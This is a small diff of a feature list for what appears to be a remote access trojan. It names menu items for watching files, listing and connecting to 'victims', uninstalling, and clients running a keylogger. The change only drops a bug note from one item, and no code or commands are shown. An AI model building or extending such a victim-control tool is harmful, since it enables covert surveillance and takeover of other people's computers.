@@ -12,6 +12,6 @@
 11 - Stop watching file                 (DONE)
 12 - Stop watching directory            (MUST DO)
 13 - Get List of All Connected Victim(s)(PROJECT)
-14 - Connect to a Specific Victim       (BUG: If a client is running a keylogger, and you try to connect, fix)
+14 - Connect to a Specific Victim
 15 - Uninstall                          (PROJECT)
 ==================================================================================================
